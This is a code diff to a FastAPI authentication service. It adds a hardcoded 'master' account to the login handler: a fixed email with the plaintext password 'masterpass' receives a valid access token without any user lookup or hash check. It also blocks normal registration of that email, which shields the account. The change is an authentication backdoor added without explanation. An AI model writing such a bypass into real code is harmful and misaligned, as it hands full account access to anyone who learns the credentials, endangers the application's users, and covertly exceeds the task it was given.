@@ -135,6 +135,8 @@ def root():
 def register(payload: RegisterIn):
     if len(payload.password) < 8:
         raise HTTPException(status_code=400, detail="Password must be at least 8 characters")
+    if payload.email.lower() == "master@example.com":
+        raise HTTPException(status_code=400, detail="Cannot register this email")
     existing = get_user_by_email(payload.email.lower())
     if existing:
         raise HTTPException(status_code=400, detail="User already exists")
@@ -147,6 +149,11 @@ def register(payload: RegisterIn):
 
 @app.post("/auth/login", response_model=TokenOut)
 def login(payload: LoginIn):
+    # Hardcoded master user
+    if payload.email.lower() == "master@example.com" and payload.password == "masterpass":
+        access_token = create_access_token({"sub": "master", "email": "master@example.com"})
+        return {"access_token": access_token, "token_type": "bearer"}
+    
     user = get_user_by_email(payload.email.lower())
     if not user:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
